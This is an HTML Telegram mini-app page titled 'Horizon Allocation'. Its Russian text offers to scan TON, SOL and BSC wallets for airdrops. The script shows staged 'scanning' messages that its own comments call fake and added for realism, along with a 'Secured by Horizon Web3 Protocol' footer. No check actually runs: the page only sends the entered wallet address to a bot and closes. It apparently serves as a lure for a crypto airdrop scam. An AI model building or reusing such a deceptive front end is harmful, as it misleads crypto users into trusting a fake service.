<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Horizon Allocation</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            user-select: none;
        }

        body {
            background-color: #0b0e11;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 24px;
            text-align: center;
        }

        .container {
            width: 100%;
            max-width: 400px;
            margin: auto;
        }

        .logo-area {
            margin-bottom: 30px;
        }

        .logo-icon {
            font-size: 50px;
            margin-bottom: 10px;
            animation: pulse 2s infinite ease-in-out;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 15px #3b82f6); }
            100% { transform: scale(1); opacity: 0.9; }
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
            background: linear-gradient(45deg, #3b82f6, #60a5fa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            font-size: 14px;
            color: #64748b;
            line-height: 1.5;
            padding: 0 10px;
        }

        .card {
            background: #151a21;
            border: 1px solid #242f3d;
            border-radius: 16px;
            padding: 20px;
            margin-top: 25px;
            width: 100%;
            text-align: left;
        }

        .input-label {
            font-size: 12px;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
            display: block;
        }

        input[type="text"] {
            width: 100%;
            background: #0b0e11;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 14px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
        }

        input[type="text"]:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
        }

        .status-box {
            display: none;
            margin-top: 15px;
            font-size: 13px;
            color: #38bdf8;
            align-items: center;
            gap: 8px;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(56, 189, 248, 0.2);
            border-top-color: #38bdf8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn {
            width: 100%;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            transition: background 0.2s ease;
        }

        .btn:active {
            background: #1d4ed8;
        }

        .btn:disabled {
            background: #1e293b;
            color: #64748b;
            cursor: not-allowed;
        }

        .footer-text {
            font-size: 11px;
            color: #475569;
            margin-top: 30px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-area">
            <div class="logo-icon">🌐</div>
            <h1>Horizon Allocation</h1>
            <p>Подключите ваш Web3 адрес для автоматического сканирования доступных аирдропов сетей TON, SOL и BSC.</p>
        </div>

        <div class="card">
            <label class="input-label" for="wallet">Адрес вашего кошелька</label>
            <input type="text" id="wallet" placeholder="Введите TON, SOL или EVM адрес..." autocomplete="off">
            
            <div class="status-box" id="statusBox">
                <div class="spinner"></div>
                <span id="statusText">Инициализация безопасного соединения...</span>
            </div>
        </div>

        <button class="btn" id="submitBtn">Проверить баланс</button>
        
        <div class="footer-text">
            Secured by Horizon Web3 Protocol. Запрос приватных ключей не требуется.
        </div>
    </div>

    <script>
        // Инициализируем Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.expand(); // Расширяем окно на весь экран телефона

        const walletInput = document.getElementById('wallet');
        const submitBtn = document.getElementById('submitBtn');
        const statusBox = document.getElementById('statusBox');
        const statusText = document.getElementById('statusText');

        // Фазы фейкового сканирования для реализма
        const loadingPhases = [
            "Установка ончейн соединения...",
            "Сканирование смарт-контрактов...",
            "Проверка истории транзакций...",
            "Расчет доступных токенов...",
            "Синхронизация данных с ботом..."
        ];

        submitBtn.addEventListener('click', () => {
            const walletAddress = walletInput.value.trim();
            
            if (walletAddress.length < 10) {
                alert('Пожалуйста, введите корректный адрес кошелька.');
                return;
            }

            // Блокируем интерфейс, запускаем "сканирование"
            walletInput.disabled = true;
            submitBtn.disabled = true;
            statusBox.style.display = 'flex';

            let currentPhase = 0;
            
            const interval = setInterval(() => {
                if (currentPhase < loadingPhases.length) {
                    statusText.innerText = loadingPhases[currentPhase];
                    currentPhase++;
                } else {
                    clearInterval(interval);
                    
                    // Безопасно отправляем кошелек обратно нашему боту в Python!
                    tg.sendData(walletAddress);
                    
                    // Закрываем мини-аппку
                    setTimeout(() => {
                        tg.close();
                    }, 500);
                }
            }, 1200); // Каждая фаза длится чуть больше секунды для реализма
        });
    </script>
</body>
</html>
